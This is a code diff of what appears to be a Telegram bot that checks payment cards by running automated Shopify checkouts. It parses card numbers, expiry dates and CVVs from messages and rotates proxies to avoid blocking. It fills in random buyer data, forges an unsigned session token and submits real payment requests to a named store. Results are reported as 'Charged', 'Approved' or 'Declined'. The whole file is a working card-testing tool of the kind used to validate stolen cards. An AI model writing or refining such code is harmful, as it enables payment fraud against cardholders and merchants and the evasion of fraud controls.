@@ -304,14 +304,10 @@ def format_shopify_response(cc, mes, ano, cvv, raw_response, timet, profile, use
     
     # Extract clean error message - only the error identifier before colon
     if "DECLINED - " in raw_response:
-        # Get everything after "DECLINED - "
         response_display = raw_response.split("DECLINED - ")[-1]
-        # Take only the error identifier (part before colon)
         if ":" in response_display:
             response_display = response_display.split(":")[0].strip()
-        # Take only first line if multiple lines
         response_display = response_display.split('\n')[0]
-        # Trim to reasonable length
         if len(response_display) > 30:
             response_display = response_display[:27] + "..."
     elif "ORDER_PLACED - " in raw_response:
@@ -319,7 +315,6 @@ def format_shopify_response(cc, mes, ano, cvv, raw_response, timet, profile, use
     elif "APPROVED - " in raw_response:
         response_display = "APPROVED"
     elif "GENERIC_ERROR" in raw_response:
-        # Extract just GENERIC_ERROR or similar error codes
         if ":" in raw_response:
             response_display = raw_response.split(":")[0].strip()
         else:
@@ -343,7 +338,6 @@ def format_shopify_response(cc, mes, ano, cvv, raw_response, timet, profile, use
     elif "FRAUD" in raw_response.upper():
         response_display = "FRAUD"
     else:
-        # Take first part before colon or first 30 characters
         if ":" in raw_response:
             response_display = raw_response.split(":")[0].strip()
             if len(response_display) > 30:
@@ -353,10 +347,8 @@ def format_shopify_response(cc, mes, ano, cvv, raw_response, timet, profile, use
 
     raw_response_upper = raw_response.upper()
 
-    # Check for NO RECEIPT ID first (before success checks) - THIS IS THE FIX
     if "NO RECEIPT ID" in raw_response_upper:
         status_flag = "Declined ❌"
-    # Check for SUCCESS indicators
     elif any(keyword in raw_response_upper for keyword in [
         "ORDER_PLACED", "SUBMITSUCCESS", "SUCCESSFUL", "APPROVED", "RECEIPT",
         "COMPLETED", "PAYMENT_SUCCESS", "CHARGE_SUCCESS", "THANK_YOU",
@@ -366,7 +358,6 @@ def format_shopify_response(cc, mes, ano, cvv, raw_response, timet, profile, use
         "PROCESSINGRECEIPT", "AUTHORIZED", "YOUR ORDER IS CONFIRMED"
     ]):
         status_flag = "Charged ✅"
-    # Check for CAPTCHA
     elif any(keyword in raw_response_upper for keyword in [
         "CAPTCHA", "SOLVE THE CAPTCHA", "CAPTCHA_METADATA_MISSING", 
         "CAPTCHA DETECTED", "CAPTCHA_REQUIRED", "CAPTCHA_VALIDATION_FAILED", 
@@ -375,7 +366,6 @@ def format_shopify_response(cc, mes, ano, cvv, raw_response, timet, profile, use
         "RECAPTCHA", "I'M NOT A ROBOT", "PLEASE VERIFY"
     ]):
         status_flag = "Captcha ⚠️"
-    # Check for PAYMENT ERROR
     elif any(keyword in raw_response_upper for keyword in [
         "THERE WAS AN ISSUE PROCESSING YOUR PAYMENT", "PAYMENT ISSUE",
         "ISSUE PROCESSING", "PAYMENT ERROR", "PAYMENT PROBLEM",
@@ -383,22 +373,18 @@ def format_shopify_response(cc, mes, ano, cvv, raw_response, timet, profile, use
         "YOUR PAYMENT COULDN'T BE PROCESSED", "PAYMENT FAILED"
     ]):
         status_flag = "Declined ❌"
-    # Check for INSUFFICIENT FUNDS
     elif any(keyword in raw_response_upper for keyword in [
         "INSUFFICIENT FUNDS", "INSUFFICIENT_FUNDS", "FUNDS", "NOT ENOUGH MONEY"
     ]):
         status_flag = "Declined ❌"
-    # Check for INVALID CARD
     elif any(keyword in raw_response_upper for keyword in [
         "INVALID CARD", "CARD IS INVALID", "CARD_INVALID", "CARD NUMBER IS INVALID"
     ]):
         status_flag = "Declined ❌"
-    # Check for EXPIRED CARD
     elif any(keyword in raw_response_upper for keyword in [
         "EXPIRED", "CARD HAS EXPIRED", "CARD_EXPIRED", "EXPIRATION DATE"
     ]):
         status_flag = "Declined ❌"
-    # Check for 3D Secure
     elif any(keyword in raw_response_upper for keyword in [
         "3D", "AUTHENTICATION", "OTP", "VERIFICATION", "CVV-MATCH-OTP", 
         "3DS", "PENDING", "SECURE REQUIRED", "SECURE_CODE", "AUTH_REQUIRED",
@@ -407,25 +393,21 @@ def format_shopify_response(cc, mes, ano, cvv, raw_response, timet, profile, use
         "VERIFICATION_REQUIRED", "CARD_VERIFICATION", "AUTHENTICATE"
     ]):
         status_flag = "Approved ❎"
-    # Check for CVV errors
     elif any(keyword in raw_response_upper for keyword in [
         "INVALID CVC", "INCORRECT CVC", "CVC_INVALID", "CVV", "SECURITY CODE"
     ]):
         status_flag = "Declined ❌"
-    # Check for fraud
     elif any(keyword in raw_response_upper for keyword in [
         "FRAUD", "FRAUD_SUSPECTED", "SUSPECTED_FRAUD", "FRAUDULENT",
         "RISKY", "HIGH_RISK", "SECURITY_VIOLATION", "SUSPICIOUS"
     ]):
         status_flag = "Fraud ⚠️"
-    # Check for proxy errors
     elif "NO_PROXY_AVAILABLE" in raw_response_upper:
         status_flag = "Proxy Error 🚫"
     elif "PROXY_BLOCKED" in raw_response_upper:
         status_flag = "Proxy Blocked 🚫"
     elif "PROXY_DEAD" in raw_response_upper:
         status_flag = "Proxy Dead 🚫"
-    # Default to declined
     else:
         status_flag = "Declined ❌"
 
@@ -476,42 +458,26 @@ def format_shopify_response(cc, mes, ano, cvv, raw_response, timet, profile, use
 
 # ========== UNIVERSAL UNICODE STRIPPER & CARD EXTRACTOR ==========
 def strip_all_unicode(text):
-    """
-    Strips ALL Unicode characters, emojis, fancy fonts, and special characters
-    Returns only ASCII characters, numbers, and basic punctuation
-    """
-    # Normalize Unicode text to ASCII form
     normalized = unicodedata.normalize('NFKD', text)
-    
-    # Convert to ASCII, ignoring non-ASCII characters
     ascii_text = normalized.encode('ASCII', 'ignore').decode('ASCII')
-    
     return ascii_text
 
 
 def extract_cc_from_ascii(text):
-    """
-    Extracts credit card details from ASCII text
-    Returns (cc, mm, yy, cvv) or (None, None, None, None)
-    """
-    # Find all sequences of digits
     digit_sequences = re.findall(r'\d+', text)
     
     if len(digit_sequences) < 4:
         return None, None, None, None
     
-    # Try to identify valid card pattern
     for i in range(len(digit_sequences) - 3):
         potential_cc = digit_sequences[i]
         potential_month = digit_sequences[i+1]
         potential_year = digit_sequences[i+2]
         potential_cvv = digit_sequences[i+3]
         
-        # Validate CC length (13-19 digits)
         if not (13 <= len(potential_cc) <= 19):
             continue
             
-        # Validate month (1-12)
         try:
             month_val = int(potential_month)
             if not (1 <= month_val <= 12):
@@ -519,15 +485,12 @@ def extract_cc_from_ascii(text):
         except:
             continue
             
-        # Validate year (2 or 4 digits)
         if not (len(potential_year) in [2, 4]):
             continue
             
-        # Validate CVV (3-4 digits)
         if not (len(potential_cvv) in [3, 4]):
             continue
         
-        # All validations passed
         cc = potential_cc
         mm = potential_month.zfill(2)
         yy = potential_year[-2:] if len(potential_year) == 4 else potential_year
@@ -539,12 +502,7 @@ def extract_cc_from_ascii(text):
 
 
 def intelligent_card_parse(text):
-    """
-    Universal card parser that handles ANY type of Unicode/fancy text
-    Strips all Unicode first, then extracts CC details
-    """
     try:
-        # Step 1: Try using filter.py if available (it handles many formats)
         if FILTER_AVAILABLE:
             try:
                 all_cards, unique_cards = extract_cards(text)
@@ -557,11 +515,9 @@ def intelligent_card_parse(text):
                         yy = parts[2].strip()
                         cvv = parts[3].strip()
                         
-                        # Ensure 2-digit year
                         if len(yy) == 4:
                             yy = yy[-2:]
                         
-                        # Validate
                         if (13 <= len(cc) <= 19 and cc.isdigit() and 
                             mm.isdigit() and 1 <= int(mm) <= 12 and
                             yy.isdigit() and len(yy) in [2, 4] and
@@ -570,11 +526,8 @@ def intelligent_card_parse(text):
             except:
                 pass
         
-        # Step 2: Strip ALL Unicode characters (emojis, fancy fonts, special chars)
         ascii_text = strip_all_unicode(text)
         
-        # Step 3: Try direct format matching on ASCII text
-        # Pattern: cc|mm|yy|cvv
         pipe_pattern = r'(\d{13,19})\s*[\|\:\;]\s*(\d{1,2})\s*[\|\:\;]\s*(\d{2,4})\s*[\|\:\;]\s*(\d{3,4})'
         pipe_match = re.search(pipe_pattern, ascii_text)
         if pipe_match:
@@ -586,7 +539,6 @@ def intelligent_card_parse(text):
                 yy = yy[-2:]
             return cc, mm, yy, cvv
         
-        # Pattern: cc mm yy cvv (space-separated)
         space_pattern = r'(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})'
         space_match = re.search(space_pattern, ascii_text)
         if space_match:
@@ -598,7 +550,6 @@ def intelligent_card_parse(text):
                 yy = yy[-2:]
             return cc, mm, yy, cvv
         
-        # Pattern: cc,mm,yy,cvv (comma-separated)
         comma_pattern = r'(\d{13,19})\s*[,]\s*(\d{1,2})\s*[,]\s*(\d{2,4})\s*[,]\s*(\d{3,4})'
         comma_match = re.search(comma_pattern, ascii_text)
         if comma_match:
@@ -610,7 +561,6 @@ def intelligent_card_parse(text):
                 yy = yy[-2:]
             return cc, mm, yy, cvv
         
-        # Pattern: cc/mm/yy/cvv (slash-separated)
         slash_pattern = r'(\d{13,19})\s*[/]\s*(\d{1,2})\s*[/]\s*(\d{2,4})\s*[/]\s*(\d{3,4})'
         slash_match = re.search(slash_pattern, ascii_text)
         if slash_match:
@@ -622,7 +572,6 @@ def intelligent_card_parse(text):
                 yy = yy[-2:]
             return cc, mm, yy, cvv
         
-        # Pattern: cc mm/yy cvv (common format)
         common_pattern = r'(\d{13,19})\s+(\d{1,2})[/\-](\d{2,4})\s+(\d{3,4})'
         common_match = re.search(common_pattern, ascii_text)
         if common_match:
@@ -634,7 +583,6 @@ def intelligent_card_parse(text):
                 yy = yy[-2:]
             return cc, mm, yy, cvv
         
-        # Pattern: look for "Card:" or "CC:" followed by details
         card_label_pattern = r'(?:card|cc|c[ck])\s*[:：=]\s*(\d{13,19})[\s\|:,]+(\d{1,2})[\s\|:,]+(\d{2,4})[\s\|:,]+(\d{3,4})'
         card_label_match = re.search(card_label_pattern, ascii_text, re.IGNORECASE)
         if card_label_match:
@@ -646,7 +594,6 @@ def intelligent_card_parse(text):
                 yy = yy[-2:]
             return cc, mm, yy, cvv
         
-        # Step 4: If no pattern matched, try generic digit sequence extraction
         cc, mm, yy, cvv = extract_cc_from_ascii(ascii_text)
         if cc:
             return cc, mm, yy, cvv
@@ -657,12 +604,7 @@ def intelligent_card_parse(text):
     return None, None, None, None
 
 
-# ========== CARD PARSING FUNCTION ==========
 def parse_card_input(card_input):
-    """
-    Parse card input using universal Unicode stripper
-    Returns (cc, mm, yy, cvv) tuple or (None, None, None, None) if invalid
-    """
     return intelligent_card_parse(card_input)
 
 
@@ -681,10 +623,8 @@ class ShopifyHTTPCheckout:
         self.proxy_response_time = 0.0
         self.max_proxy_retries = 3
 
-        # Session for maintaining cookies
         self.client = None
 
-        # Headers template based on captured requests
         self.headers = {
             'authority': 'meta-app-prod-store-1.myshopify.com',
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
@@ -703,25 +643,24 @@ class ShopifyHTTPCheckout:
 
         # Dynamic data storage
         self.checkout_token = None
-        self.session_token = None  # x-checkout-one-session-token for headers
-        self.graphql_session_token = None  # checkout_token-timestamp for GraphQL variables
+        self.session_token = None
+        self.graphql_session_token = None
         self.receipt_id = None
         self.cart_token = None
         self.variant_id = "43207284392098"
         self.product_id = "7890988171426"
 
-        # Store extracted schema info
         self.proposal_id = None
         self.submit_id = None
         self.delivery_strategy_handle = None
         
-        # FIX: Store queueToken from Proposal response for Submit
+        # Store queueToken from Proposal response for Submit
         self.proposal_queue_token = None
         
-        # FIX: Store paymentMethodIdentifier from Proposal seller response
+        # Store paymentMethodIdentifier from Proposal seller response
         self.payment_method_identifier = None
         
-        # FIX: Store creditCardBin (first 8 digits of card)
+        # Store creditCardBin (first 8 digits of card)
         self.credit_card_bin = None
 
         self.logger = ShopifyLogger(user_id)
@@ -744,14 +683,12 @@ class ShopifyHTTPCheckout:
         self.phone = f"215{random.randint(100, 999)}{random.randint(1000, 9999)}"
 
     async def random_delay(self, min_sec=0.5, max_sec=2.0):
-        """Random delay between requests"""
         await asyncio.sleep(random.uniform(min_sec, max_sec))
 
     def step(self, num, name, action, details=None, status="PROCESSING"):
         return self.logger.step(num, name, action, details, status)
 
     def extract_checkout_token(self, url):
-        """Extract checkout token from URL"""
         patterns = [
             r'/checkouts/cn/([^/?]+)',
             r'/checkout/[^/]+/cn/([^/?]+)',
@@ -764,34 +701,28 @@ class ShopifyHTTPCheckout:
         return None
 
     def generate_random_string(self, length=16):
-        """Generate random string for cookies"""
         return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
 
     def generate_uuid(self):
-        """Generate UUID format string"""
         return f"{self.generate_random_string(8)}-{self.generate_random_string(4)}-4{self.generate_random_string(3)}-{random.choice(['8','9','a','b'])}{self.generate_random_string(3)}-{self.generate_random_string(12)}"
 
     def generate_tracking_ids(self):
-        """Generate tracking IDs like _shopify_y and _shopify_s"""
         return self.generate_uuid(), self.generate_uuid()
 
     def generate_timestamp(self):
-        """Generate timestamp for session token (milliseconds since epoch)"""
         return str(int(time.time() * 1000))
 
     def construct_graphql_session_token(self):
-        """Construct session token for GraphQL variables: checkout_token-timestamp"""
         if not self.checkout_token:
             return None
         timestamp = self.generate_timestamp()
         return f"{self.checkout_token}-{timestamp}"
 
     def generate_session_token_from_checkout(self):
-        """Generate a session token based on checkout token when not found in response - KEPT AS IS"""
+        """KEPT AS IS - Generate a session token based on checkout token when not found in response"""
         if not self.checkout_token:
             return None
 
-        import base64
         header = json.dumps({"alg": "none", "typ": "JWT"})
         payload = json.dumps({
             "checkout_token": self.checkout_token,
@@ -806,7 +737,7 @@ class ShopifyHTTPCheckout:
         return f"{header_b64}.{payload_b64}.{signature}"
 
     def extract_session_token_from_html_aggressive(self, html_content):
-        """Aggressively extract session token from HTML using all possible patterns - KEPT AS IS"""
+        """KEPT AS IS - Aggressively extract session token from HTML using all possible patterns"""
         session_token = None
 
         patterns = [
@@ -844,7 +775,6 @@ class ShopifyHTTPCheckout:
         return None
 
     def extract_bootstrap_data(self, html_content):
-        """Extract bootstrap data from checkout page HTML"""
         try:
             patterns = [
                 r'window\.__INITIAL_STATE__\s*=\s*({.+?});',
@@ -868,7 +798,6 @@ class ShopifyHTTPCheckout:
             return {}
 
     def extract_delivery_strategy(self, html_content):
-        """Extract available delivery strategy handle from page"""
         try:
             pattern = r'"handle":"([a-f0-9]+-be73b24eea304774d3c2df281c6988e5)"'
             matches = re.findall(pattern, html_content)
@@ -886,14 +815,14 @@ class ShopifyHTTPCheckout:
             return None
 
     async def add_to_cart_and_get_checkout(self, max_retries=3):
-        """Add product to cart and get checkout page in minimal steps"""
+        """Add product to cart and get checkout page - RESTORED ORIGINAL POST FLOW"""
         for attempt in range(max_retries):
             try:
                 self.step(2 if attempt == 0 else 2 + attempt, "ADD TO CART", 
                          f"Adding product to cart and getting checkout (Attempt {attempt + 1}/{max_retries})", 
                          f"Variant: {self.variant_id}")
 
-                # Step 2.1: Add to cart
+                # Step 2.1: Add to cart via POST /cart/add
                 cart_headers = {
                     **self.headers,
                     'accept': 'application/javascript',
@@ -978,22 +907,22 @@ class ShopifyHTTPCheckout:
 
                 await self.random_delay(1, 2)
 
-                # Step 2.2: Start checkout (GET request to cart URL like the captured flow)
-                self.step(3, "START CHECKOUT", "Initiating checkout process via cart URL")
+                # Step 2.2: Start checkout via POST /cart (RESTORED ORIGINAL FLOW)
+                self.step(3, "START CHECKOUT", "Initiating checkout process")
 
                 checkout_start_headers = {
                     **self.headers,
+                    'content-type': 'application/x-www-form-urlencoded',
+                    'origin': self.base_url,
                     'referer': self.product_url,
                     'sec-fetch-site': 'same-origin'
                 }
 
-                # FIX: Use GET request with cart token like the captured flow shows
-                cart_key = self.generate_random_string(32)
                 try:
-                    cart_url = f"{self.base_url}/cart/c/{self.checkout_token or self.generate_random_string(24)}?key={cart_key}&skip_shop_pay=true"
-                    resp = await self.client.get(
-                        cart_url,
+                    resp = await self.client.post(
+                        f"{self.base_url}/cart",
                         headers=checkout_start_headers,
+                        data={'checkout': ''},
                         follow_redirects=True,
                         timeout=30
                     )
@@ -1047,13 +976,11 @@ class ShopifyHTTPCheckout:
                     if not self.delivery_strategy_handle:
                         self.delivery_strategy_handle = "2c0a12cd1c5acf9522569dd39f6bb661-be73b24eea304774d3c2df281c6988e5"
 
-                    # FIX: Use updated Proposal ID from captured data
                     if 'operationName":"Proposal".*?"id":"([^"]+)"' in bootstrap_data:
                         self.proposal_id = bootstrap_data['operationName":"Proposal".*?"id":"([^"]+)"']
                     else:
                         self.proposal_id = "4abf98439cf21062e036dd8d2e449f5e15e12d9d358a82376aa630c7c8c8c81e"
 
-                    # FIX: Use updated SubmitForCompletion ID from captured data
                     if 'operationName":"SubmitForCompletion".*?"id":"([^"]+)"' in bootstrap_data:
                         self.submit_id = bootstrap_data['operationName":"SubmitForCompletion".*?"id":"([^"]+)"']
                     else:
@@ -1101,7 +1028,7 @@ class ShopifyHTTPCheckout:
         proxy_attempts = 0
         max_attempts = 3
         
-        # FIX: Set credit card bin (first 8 digits)
+        # Set credit card bin (first 8 digits)
         self.credit_card_bin = cc[:8]
         
         while proxy_attempts < max_attempts:
@@ -1133,7 +1060,6 @@ class ShopifyHTTPCheckout:
                             self.proxy_used = True
                             self.logger.data_extracted("Proxy Info", f"{self.proxy_url[:50]}... | Response: {self.proxy_response_time:.2f}s", "Proxy System")
                             
-                            # Mark proxy as successful initially
                             mark_proxy_success(self.proxy_url, self.proxy_response_time)
                         else:
                             self.proxy_status = "Dead 🚫"
@@ -1179,7 +1105,6 @@ class ShopifyHTTPCheckout:
                     if resp.status_code != 200:
                         self.logger.error_log("HOMEPAGE", f"Failed to load homepage: {resp.status_code}")
                         
-                        # Check if it's a blocking/ban status code
                         if resp.status_code in [403, 429, 492, 503]:
                             self.logger.error_log("BLOCKED", f"Proxy blocked by Shopify (Status: {resp.status_code})")
                             await self.client.aclose()
@@ -1189,14 +1114,12 @@ class ShopifyHTTPCheckout:
                                 continue
                             return False, "PROXY_BLOCKED"
                         
-                        # Update proxy success with actual response time
                         mark_proxy_success(self.proxy_url, request_time)
                         await self.client.aclose()
                         if proxy_attempts < max_attempts:
                             continue
                         return False, f"Failed to load homepage: {resp.status_code}"
                     
-                    # Update proxy success with actual response time
                     mark_proxy_success(self.proxy_url, request_time)
                     
                 except httpx.ProxyError as e:
@@ -1241,7 +1164,7 @@ class ShopifyHTTPCheckout:
 
                 stable_id = self.generate_uuid()
 
-                # FIX: Initial queueToken is random for Proposal
+                # Initial queueToken is random for Proposal
                 initial_queue_token = f"{self.generate_random_string(43)}=="
 
                 proposal_variables = {
@@ -1339,7 +1262,7 @@ class ShopifyHTTPCheckout:
                                 "phone": ""
                             }
                         },
-                        # FIX: Add creditCardBin to Proposal payload
+                        # Add creditCardBin to Proposal payload
                         "creditCardBin": self.credit_card_bin
                     },
                     "buyerIdentity": {
@@ -1390,7 +1313,7 @@ class ShopifyHTTPCheckout:
                         "buyerRefusesDuties": False
                     },
                     "cartMetafields": [],
-                    # FIX: Add includeTaxStrategyLines
+                    # Add includeTaxStrategyLines
                     "includeTaxStrategyLines": False
                 }
 
@@ -1411,7 +1334,7 @@ class ShopifyHTTPCheckout:
                     'shopify-checkout-source': f'id="{self.checkout_token}", type="cn"',
                     'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36',
                     'x-checkout-one-session-token': self.session_token,
-                    # FIX: Updated build ID and deploy stage
+                    # Updated build ID and deploy stage from captured data
                     'x-checkout-web-build-id': 'd337b60249d314b13499c517706706e019af3129',
                     'x-checkout-web-deploy-stage': 'canary',
                     'x-checkout-web-server-handling': 'fast',
@@ -1444,17 +1367,14 @@ class ShopifyHTTPCheckout:
                     try:
                         proposal_resp = resp.json()
                         
-                        # FIX: Check for errors but also extract queueToken even if there are non-fatal errors
-                        errors = proposal_resp.get('data', {}).get('session', {}).get('negotiate', {}).get('errors', [])
-                        
-                        # FIX: Extract queueToken from Proposal response for Submit
+                        # Extract queueToken from Proposal response for Submit
                         result_data = proposal_resp.get('data', {}).get('session', {}).get('negotiate', {}).get('result', {})
                         if result_data:
                             self.proposal_queue_token = result_data.get('queueToken')
                             if self.proposal_queue_token:
                                 self.logger.data_extracted("Queue Token (from Proposal)", self.proposal_queue_token[:30] + "...", "Proposal Response")
                             
-                            # FIX: Extract paymentMethodIdentifier from seller proposal
+                            # Extract paymentMethodIdentifier from seller proposal
                             seller_proposal = result_data.get('sellerProposal', {})
                             payment_data = seller_proposal.get('payment', {})
                             available_lines = payment_data.get('availablePaymentLines', [])
@@ -1471,11 +1391,12 @@ class ShopifyHTTPCheckout:
                                 self.payment_method_identifier = "ca4f484d341716df9c8b4c59632eb0e7"
                                 self.logger.data_extracted("Payment Method Identifier (default)", self.payment_method_identifier, "Default fallback")
                         
-                        # Check for fatal errors
+                        # Check for errors
+                        errors = proposal_resp.get('data', {}).get('session', {}).get('negotiate', {}).get('errors', [])
+                        # Filter fatal errors (exclude non-fatal ones like PAYMENTS_UNACCEPTABLE_PAYMENT_AMOUNT)
                         fatal_errors = [e for e in errors if e.get('code') not in ['PAYMENTS_UNACCEPTABLE_PAYMENT_AMOUNT']]
                         if fatal_errors:
                             error_msg = fatal_errors[0].get('nonLocalizedMessage') or fatal_errors[0].get('localizedMessage', 'Unknown error')
-                            # Extract just the error type
                             if ":" in error_msg:
                                 error_msg = error_msg.split(":")[0].strip()
                             if proxy_attempts < max_attempts:
@@ -1612,7 +1533,7 @@ class ShopifyHTTPCheckout:
                         "sessionInput": {
                             "sessionToken": self.graphql_session_token
                         },
-                        # FIX: Use queueToken from Proposal response
+                        # Use queueToken from Proposal response
                         "queueToken": self.proposal_queue_token,
                         "discounts": {
                             "lines": [],
@@ -1693,7 +1614,7 @@ class ShopifyHTTPCheckout:
                             "paymentLines": [{
                                 "paymentMethod": {
                                     "directPaymentMethod": {
-                                        # FIX: Use extracted paymentMethodIdentifier
+                                        # Use extracted paymentMethodIdentifier
                                         "paymentMethodIdentifier": self.payment_method_identifier,
                                         "sessionId": payment_session_id,
                                         "billingAddress": {
@@ -1747,7 +1668,7 @@ class ShopifyHTTPCheckout:
                                     "phone": ""
                                 }
                             },
-                            # FIX: Add creditCardBin to Submit payload
+                            # Add creditCardBin to Submit payload
                             "creditCardBin": self.credit_card_bin
                         },
                         "buyerIdentity": {
@@ -1805,7 +1726,7 @@ class ShopifyHTTPCheckout:
                         "requestUrl": f"https://meta-app-prod-store-1.myshopify.com/checkouts/cn/{self.checkout_token}/en-us/?_r={self.generate_random_string(32)}&skip_shop_pay=true",
                         "pageId": f"{self.generate_random_string(8)}-{random.choice(string.ascii_uppercase)}{random.choice(string.ascii_uppercase)}{random.choice(string.ascii_uppercase)}{random.choice(string.ascii_uppercase)}-{random.choice(string.ascii_uppercase)}{random.choice(string.ascii_uppercase)}{random.choice(string.ascii_uppercase)}{random.choice(string.ascii_uppercase)}-{random.choice(string.ascii_uppercase)}{random.choice(string.ascii_uppercase)}{random.choice(string.ascii_uppercase)}{random.choice(string.ascii_uppercase)}-{self.generate_random_string(12)}".upper()
                     },
-                    # FIX: Add includeTaxStrategyLines
+                    # Add includeTaxStrategyLines
                     "includeTaxStrategyLines": False
                 }
 
@@ -1836,7 +1757,6 @@ class ShopifyHTTPCheckout:
 
                         if 'errors' in submit_resp and submit_resp['errors']:
                             error_msg = submit_resp['errors'][0].get('message', 'Unknown error')
-                            # Extract just the error type
                             if ":" in error_msg:
                                 error_msg = error_msg.split(":")[0].strip()
                             if proxy_attempts < max_attempts:
@@ -1890,7 +1810,6 @@ class ShopifyHTTPCheckout:
                         continue
                     return False, f"Submit error: {str(e)[:50]}"
                 
-                # If we get here and haven't returned, try another proxy
                 if proxy_attempts < max_attempts:
                     await self.random_delay(1, 2)
                     continue
@@ -1923,15 +1842,14 @@ class ShopifyHTTPCheckout:
                 if self.client:
                     await self.client.aclose()
         
-        # If we've exhausted all proxy attempts
         return False, "PROXY_DEAD - All proxy attempts failed"
 
     async def poll_receipt(self, headers):
-        """Poll for receipt status WITH PROXY - FIXED with updated poll ID"""
+        """Poll for receipt status WITH PROXY - Updated poll ID"""
         try:
             graphql_url = f"{self.base_url}/checkouts/internal/graphql/persisted"
 
-            # FIX: Updated PollForReceipt ID from captured data
+            # Updated PollForReceipt ID from captured data
             poll_id = "42b5051ef09da17cd5cb5789121ab3adab0ca8c9ec7547a4d431bb17060e757f"
 
             poll_params = {
@@ -1971,8 +1889,6 @@ class ShopifyHTTPCheckout:
                     if receipt_type == 'FailedReceipt':
                         error_info = receipt_data.get('processingError', {})
                         error_code = error_info.get('code', 'UNKNOWN')
-                        error_msg = error_info.get('messageUntranslated', 'Payment failed')
-                        # Extract just the error code
                         return False, f"DECLINED - {error_code}"
 
                     elif receipt_type == 'ProcessedReceipt':
@@ -2018,7 +1934,6 @@ class ShopifyChargeCheckerHTTP:
         self.logger.start_check(card_details)
 
         try:
-            # Parse card using universal Unicode stripper
             cc, mes, ano, cvv = parse_card_input(card_details)
             
             if not cc or not mes or not ano or not cvv:
@@ -2026,7 +1941,6 @@ class ShopifyChargeCheckerHTTP:
                 self.logger.error_log("INVALID_FORMAT", f"Could not parse card from: {card_details[:100]}...")
                 return format_shopify_response("", "", "", "", "Invalid card format - could not extract CC details", elapsed_time, username, user_data, self.proxy_status)
 
-            # Additional validation
             if len(cc) < 15 or len(cc) > 19:
                 elapsed_time = time.time() - start_time
                 return format_shopify_response(cc, mes, ano, cvv, "Invalid card number length", elapsed_time, username, user_data, self.proxy_status)
@@ -2041,11 +1955,9 @@ class ShopifyChargeCheckerHTTP:
 
             self.logger.card_details_log(cc, mes, ano, cvv)
 
-            # Create checker instance with proxy integration
             checker = ShopifyHTTPCheckout(self.user_id)
             success, result = await checker.execute_checkout(cc, mes, ano, cvv)
             
-            # Update proxy status from checker
             self.proxy_status = checker.proxy_status
 
             elapsed_time = time.time() - start_time
@@ -2062,7 +1974,6 @@ class ShopifyChargeCheckerHTTP:
             self.logger.error_log("UNKNOWN", str(e))
             self.logger.complete_result(False, "UNKNOWN_ERROR", str(e), elapsed_time)
             try:
-                # Try to parse card for response
                 parsed_cc, parsed_mes, parsed_ano, parsed_cvv = parse_card_input(card_details)
                 if parsed_cc:
                     cc, mes, ano, cvv = parsed_cc, parsed_mes, parsed_ano, parsed_cvv
@@ -2070,7 +1981,6 @@ class ShopifyChargeCheckerHTTP:
                     cc = mes = ano = cvv = ""
             except:
                 cc = mes = ano = cvv = ""
-            # Extract clean error message
             error_msg = str(e)
             if ":" in error_msg:
                 error_msg = error_msg.split(":")[0].strip()
@@ -2138,7 +2048,6 @@ async def handle_shopify_charge(client: Client, message: Message):
 
         card_details = ' '.join(args[1:])
 
-        # Validate that we can parse the card using universal Unicode stripper
         cc, mes, ano, cvv = parse_card_input(card_details)
         if not cc or not mes or not ano or not cvv:
             await message.reply("""<pre>❌ Invalid Format</pre>
@@ -2148,7 +2057,6 @@ async def handle_shopify_charge(client: Client, message: Message):
 ━━━━━━━━━━━━━""")
             return
 
-        # Check if proxy system is available
         if not PROXY_SYSTEM_AVAILABLE:
             await message.reply("""<pre>❌ Proxy System Unavailable</pre>
 ━━━━━━━━━━━━━
